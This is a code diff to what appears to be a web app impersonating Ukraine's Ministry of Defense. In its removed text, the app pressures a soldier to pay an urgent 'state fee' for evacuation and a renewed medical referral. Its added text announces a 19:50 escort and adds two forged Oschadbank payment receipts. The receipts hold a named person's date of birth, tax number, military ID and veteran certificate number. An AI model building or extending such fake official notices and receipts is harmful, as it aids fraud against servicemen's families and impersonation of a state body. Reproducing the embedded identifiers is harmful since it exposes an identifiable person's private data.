@@ -41,10 +41,10 @@
         .nr-sub { background: #e2e873; color: #000; text-align: center; font-size: 8px; font-weight: 700; padding: 3px 0; text-transform: uppercase; }
         .nr-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 15px; font-size: 11px; }
         .nr-label { font-size: 8px; font-weight: 700; color: #777; text-transform: uppercase; }
-        .nr-val { font-weight: 600; line-height: 1.2; }
-        .nr-purpose { background: #f9f9f9; border: 1px solid #eee; padding: 8px; font-style: italic; margin: 0 15px; font-size: 10px; }
-        .nr-footer { border-top: 2px solid #000; padding: 15px; display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
-        .nr-stamp { width: 85px; height: 85px; border: 2px solid #004a32; border-radius: 50%; transform: rotate(-10deg); display: flex; flex-direction: column; align-items: center; justify-content: center; color: #004a32; font-weight: 800; font-size: 10px; text-align: center; line-height: 1; }
+        .nr-val { font-weight: 600; line-height: 1.2; word-break: break-word; }
+        .nr-purpose { background: #f9f9f9; border: 1px solid #eee; padding: 8px; font-style: italic; margin: 0 15px; font-size: 10px; word-break: break-word; }
+        .nr-footer { border-top: 2px solid #000; padding: 15px; display: flex; justify-content: space-between; align-items: center; margin-top: 10px; flex-wrap: wrap; gap: 10px; }
+        .nr-stamp { width: 85px; height: 85px; border: 2px solid #004a32; border-radius: 50%; transform: rotate(-10deg); display: flex; flex-direction: column; align-items: center; justify-content: center; color: #004a32; font-weight: 800; font-size: 10px; text-align: center; line-height: 1; flex-shrink: 0; }
         .bell-container { position: relative; cursor: pointer; }
         .bell-dot { position: absolute; top: -2px; right: -2px; width: 16px; height: 16px; background: #ef4444; border-radius: 50%; color: white; font-size: 9px; display: flex; align-items: center; justify-content: center; font-weight: 900; border: 2px solid white; }
         
@@ -139,6 +139,12 @@
                     <h2 className="text-xl font-black tracking-tighter uppercase italic">{title}</h2>
                 </div>
             );
+
+            // Для звернення на ім'я по батькові
+            const nameParts = userData.name.split(' ');
+            const firstName = nameParts[1] || 'МАКСИМ';
+            const middleName = nameParts[2] || 'ОЛЕКСАНДРОВИЧ';
+            const shortName = `${firstName} ${middleName}`.toUpperCase();
 
             if (authState === 'welcome') {
                 return (
@@ -292,10 +298,9 @@
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh]">
                                         <h3 className="w-full text-center text-xl font-black uppercase italic text-green-600 border-b pb-3 mb-4">Системне сповіщення</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
-                                            <p><span className="font-black text-black">МАКСИМ ОЛЕКСАНДРОВИЧ</span></p>
-                                            <p>Повідомляємо Вам, що повернення Вам коштів за переплату було оформлено та буде повернено Вам протягом трьох робочих днів.</p>
-                                            <p>Наразі для здійснення Вашої евакуації (17.02.2026 року) Вам треба сплатити <span className="font-black text-red-600">ТЕРМІНОВО</span> державний внесок за евакуаційний метод та переоформлення нового електронного направлення до КП «ДБКЛПД» ДОР, оскільки дане направлення вичерпано терміном дії. Це сталося через те, що в/ч 3052 запізно подали медичну документацію до електронної системи «ОБЕРІГ» з приводу затвердження непридатності. На даний час уся документація вже подана та зареєстрована в нашій системі ЄДР «ОБЕРІГ». Оформлення повторного електронного направлення є платним. Будь ласка, терміново сплатіть даний державний збір. Оскільки у Вас очікується евакуація, а без даного електронного направлення здійснення евакуації неможливе.</p>
-                                            <p>Розмір даного державного збору складає 0,7 від прожиткового мінімуму для працездатних осіб.</p>
+                                            <p className="font-black text-black text-base">{shortName}</p>
+                                            <p>Повідомляємо, що усі Ваші сплати було завершено (перегляньте розділ «Квитанції»).</p>
+                                            <p><span className="font-black text-red-600">Терміново!</span> Згідно з документами, поданими від в/ч 3052 до КП «ДБКЛПД» ДОР», о 19:50 Вам буде виділено супровід, який доставить Вас до КП «ДБКЛПД» ДОР» на стаціонарне обстеження та затвердження непридатності.</p>
                                             <p>З повагою,<br/>Міністерство оборони України</p>
                                         </div>
                                         <button onClick={() => setShowNotification(false)} className="w-full bg-black text-white py-4 rounded-2xl font-black uppercase mt-6 italic shadow-lg">ЗРОЗУМІЛО</button>
@@ -309,10 +314,9 @@
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh]">
                                         <h3 className="w-full text-center text-xl font-black uppercase italic text-green-600 border-b pb-3 mb-4">МІНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
-                                            <p><span className="font-black text-black">МАКСИМ ОЛЕКСАНДРОВИЧ</span></p>
-                                            <p>Повідомляємо Вам, що повернення Вам коштів за переплату було оформлено та буде повернено Вам протягом трьох робочих днів.</p>
-                                            <p>Наразі для здійснення Вашої евакуації (17.02.2026 року) Вам треба сплатити <span className="font-black text-red-600">ТЕРМІНОВО</span> державний внесок за евакуаційний метод та переоформлення нового електронного направлення до КП «ДБКЛПД» ДОР, оскільки дане направлення вичерпано терміном дії. Це сталося через те, що в/ч 3052 запізно подали медичну документацію до електронної системи «ОБЕРІГ» з приводу затвердження непридатності. На даний час уся документація вже подана та зареєстрована в нашій системі ЄДР «ОБЕРІГ». Оформлення повторного електронного направлення є платним. Будь ласка, терміново сплатіть даний державний збір. Оскільки у Вас очікується евакуація, а без даного електронного направлення здійснення евакуації неможливе.</p>
-                                            <p>Розмір даного державного збору складає 0,7 від прожиткового мінімуму для працездатних осіб.</p>
+                                            <p className="font-black text-black text-base">{shortName}</p>
+                                            <p>Повідомляємо, що усі Ваші сплати було завершено (перегляньте розділ «Квитанції»).</p>
+                                            <p><span className="font-black text-red-600">Терміново!</span> Згідно з документами, поданими від в/ч 3052 до КП «ДБКЛПД» ДОР», о 19:50 Вам буде виділено супровід, який доставить Вас до КП «ДБКЛПД» ДОР» на стаціонарне обстеження та затвердження непридатності.</p>
                                             <p>З повагою,<br/>Міністерство оборони України</p>
                                         </div>
                                         <button onClick={() => setShowDefenseModal(false)} className="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all mt-6">ЗРОЗУМІЛО</button>
@@ -472,6 +476,7 @@
                         <div className="doc-overlay">
                             <Header title="Архів квитанцій" />
                             <div className="p-6 space-y-4">
+                                {/* Існуючі квитанції */}
                                 <div className="glass-card p-6 border-l-8 border-blue-600 cursor-pointer" onClick={() => setView('receipt_old')}>
                                     <h4 className="font-black italic uppercase">Квитанція №324368</h4>
                                     <p className="text-xs text-gray-400 uppercase font-bold">Закриття реєстрів</p>
@@ -487,7 +492,110 @@
                                     <p className="text-xs text-gray-400 uppercase font-bold">16.02.2026, успішно</p>
                                     <p className="text-lg font-black mt-2">2580,00 ₴</p>
                                 </div>
+
+                                {/* Дві нові квитанції з фото */}
+                                <div className="glass-card p-6 border-l-8 border-purple-600 cursor-pointer" onClick={() => setView('receipt_img1')}>
+                                    <h4 className="font-black italic uppercase">Квитанція №3390001844000</h4>
+                                    <p className="text-xs text-gray-400 uppercase font-bold">Оформлення до 20 РВЛК</p>
+                                    <p className="text-lg font-black mt-2">1 083,50 ₴</p>
+                                </div>
+                                <div className="glass-card p-6 border-l-8 border-indigo-600 cursor-pointer" onClick={() => setView('receipt_img2')}>
+                                    <h4 className="font-black italic uppercase">Квитанція №323000397500</h4>
+                                    <p className="text-xs text-gray-400 uppercase font-bold">Адмінзбір (повторне)</p>
+                                    <p className="text-lg font-black mt-2">1 202,00 ₴</p>
+                                </div>
+
                                 <button onClick={() => setView('home')} className="back-btn">Повернутись назад</button>
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Детальний перегляд квитанції з IMG_3755.jpeg */}
+                    {view === 'receipt_img1' && (
+                        <div className="doc-overlay bg-white">
+                            <Header title="Квитанція №3390001844000" />
+                            <div className="p-4">
+                                <div className="nr-card shadow-xl">
+                                    <div className="nr-header">ОЩАДБАНК</div>
+                                    <div className="nr-sub">МІЙ БАНК. МОЯ КРАЇНА</div>
+                                    <div className="p-4 border-b">
+                                        <p className="text-center font-black uppercase text-sm">НА IBAN З КАРТКОВОГО РАХУНКУ</p>
+                                    </div>
+                                    <div className="nr-grid">
+                                        <div><p className="nr-label">Дата операції:</p><p className="nr-val">17.02.2026 18:19:01</p></div>
+                                        <div><p className="nr-label">Статус:</p><p className="nr-val text-green-700">Виконано</p></div>
+                                        <div><p className="nr-label">Номер посилання:</p><p className="nr-val">3390001844000</p></div>
+                                        <div><p className="nr-label">Через:</p><p className="nr-val">Дія.Gateway</p></div>
+                                        <div><p className="nr-label">Платник:</p><p className="nr-val">АХРЕМЕНКО Т.Г.</p></div>
+                                        <div><p className="nr-label">Рахунок платника:</p><p className="nr-val">4790 **** 0852</p></div>
+                                        <div><p className="nr-label">Отримувач:</p><p className="nr-val text-[10px]">МИНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</p></div>
+                                        <div><p className="nr-label">IBAN:</p><p className="nr-val text-[9px]">UA82820172000000260008440196</p></div>
+                                        <div><p className="nr-label">ЄДРПОУ:</p><p className="nr-val">00034022</p></div>
+                                    </div>
+                                    <div className="nr-purpose whitespace-normal">
+                                        <p className="font-bold mb-1">Призначення:</p>
+                                        «Погашення за оформлення документів до «20 РЕГІОНАЛЬНА ВІЙСЬКОВО-ЛІКАРСЬКА КОМІСІЯ» (20 РВЛК) м. Дніпро. Код: 26637746 Дані за кого сплачено: ПІБ: Аврахов Максим Олександрович Дата народження: 17.03.1987 РНОКПП: 3185200217 Звання: Солдат Місце служби: В/Ч 3052 Номер посвідчення УБД: 636331 Номер та серія військового квитка: АГ 042020
+                                    </div>
+                                    <div className="nr-footer">
+                                        <div>
+                                            <p className="nr-label">Сума + комісія:</p>
+                                            <p className="text-base font-black">882.50 + 201.00</p>
+                                            <p className="nr-label mt-1">СПИСАНО:</p>
+                                            <p className="text-2xl font-black italic">1 083,50 UAH</p>
+                                        </div>
+                                        <div className="nr-stamp">
+                                            <div>ОЩАД 24/7</div>
+                                            <div style={{fontSize:'6px', borderTop:'1px solid #004a32', margin:'2px 0', width:'80%'}}>ДЛЯ ДОВІДОК</div>
+                                            <div>ЕЛ. ЧЕК</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button onClick={() => setView('receipt_menu')} className="back-btn !mt-6">Повернутись до списку</button>
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Детальний перегляд квитанції з IMG_3754.jpeg */}
+                    {view === 'receipt_img2' && (
+                        <div className="doc-overlay bg-white">
+                            <Header title="Квитанція №323000397500" />
+                            <div className="p-4">
+                                <div className="nr-card shadow-xl">
+                                    <div className="nr-header">ОЩАДБАНК</div>
+                                    <div className="nr-sub">МІЙ БАНК. МОЯ КРАЇНА</div>
+                                    <div className="p-4 border-b">
+                                        <p className="text-center font-black uppercase text-sm">НА IBAN З КАРТКОВОГО РАХУНКУ</p>
+                                    </div>
+                                    <div className="nr-grid">
+                                        <div><p className="nr-label">Дата операції:</p><p className="nr-val">17.02.2026 09:38:45</p></div>
+                                        <div><p className="nr-label">Статус:</p><p className="nr-val text-green-700">Виконано</p></div>
+                                        <div><p className="nr-label">Номер посилання:</p><p className="nr-val">323000397500</p></div>
+                                        <div><p className="nr-label">Через:</p><p className="nr-val">Дія.Gateway</p></div>
+                                        <div><p className="nr-label">Платник:</p><p className="nr-val">АХРЕМЕНКО Т.Г.</p></div>
+                                        <div><p className="nr-label">Рахунок платника:</p><p className="nr-val">4790 **** 0852</p></div>
+                                        <div><p className="nr-label">Отримувач:</p><p className="nr-val text-[10px]">МИНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</p></div>
+                                        <div><p className="nr-label">IBAN:</p><p className="nr-val text-[9px]">UA828201720000002600084440196</p></div>
+                                        <div><p className="nr-label">ЄДРПОУ:</p><p className="nr-val">00034022</p></div>
+                                    </div>
+                                    <div className="nr-purpose">
+                                        <p className="font-bold mb-1">Призначення:</p>
+                                        Сплата адміністративного збору за повторне оформлення до КП «ДБКЛПД»ДОР», за повторну реєстрацію електронного направлення Аврахов М.О. (3185200217)
+                                    </div>
+                                    <div className="nr-footer">
+                                        <div>
+                                            <p className="nr-label">Сума + комісія:</p>
+                                            <p className="text-base font-black">980,50 + 221,50</p>
+                                            <p className="nr-label mt-1">СПИСАНО:</p>
+                                            <p className="text-2xl font-black italic">1 202,00 UAH</p>
+                                        </div>
+                                        <div className="nr-stamp">
+                                            <div>ОЩАД 24/7</div>
+                                            <div style={{fontSize:'6px', borderTop:'1px solid #004a32', margin:'2px 0', width:'80%'}}>ДЛЯ ДОВІДОК</div>
+                                            <div>ЕЛ. ЧЕК</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button onClick={() => setView('receipt_menu')} className="back-btn !mt-6">Повернутись до списку</button>
                             </div>
                         </div>
                     )}
